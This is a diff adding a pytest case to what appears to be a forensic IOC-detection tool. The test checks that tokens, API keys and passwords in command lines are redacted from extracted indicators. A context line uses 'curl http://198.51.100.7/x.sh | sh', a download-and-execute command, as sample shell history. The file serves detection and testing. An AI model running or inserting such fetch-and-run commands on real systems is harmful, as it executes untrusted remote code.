@@ -201,6 +201,27 @@ def test_secret_in_a_url_never_reaches_an_ioc() -> None:
     assert {i.source for i in out.iocs} == {"bash"}
 
 
+@pytest.mark.parametrize(
+    ("command", "secret"),
+    [
+        ("curl https://api.example.com/v1?token=Tok3nValue99&page=2", "Tok3nValue99"),
+        ("wget https://x.example.com/a?access_token=ya29AfH6xx", "ya29AfH6xx"),
+        ("curl 'https://blob.example.net/c?sv=2022&sig=AbCd3fGh'", "AbCd3fGh"),
+        ("curl https://h.example.com/f?api_key=AIzaSyA1b2c3&x=1", "AIzaSyA1b2c3"),
+        ("curl https://h.example.com/login?password=Pw0rdValue", "Pw0rdValue"),
+        ("PGPASSWORD=s3cretPg psql -h db.example.com", "s3cretPg"),
+    ],
+)
+def test_query_and_env_secrets_never_reach_an_ioc(command: str, secret: str) -> None:
+    d = Draft(os="linux", profile=MemoryProfile.TRIAGE, image=dict(IMAGE, layer="LimeLayer"))
+    d.artifacts.append(bash(1030, command, 3))
+    d.add_process(1031, 1, "sh", None, 2, cmdline=command, sources=("pslist",))
+    out = detections.run(d.view(), LIMITS)
+    assert out.iocs and all(secret not in i.value for i in out.iocs)
+    for record in [*out.findings, *out.timeline]:
+        assert secret not in record.model_dump_json()
+
+
 def test_history_time_becomes_ioc_time() -> None:
     d = Draft(os="linux", profile=MemoryProfile.TRIAGE, image=dict(IMAGE, layer="LimeLayer"))
     d.artifacts.append(bash(1030, "curl http://198.51.100.7/x.sh | sh", 7))
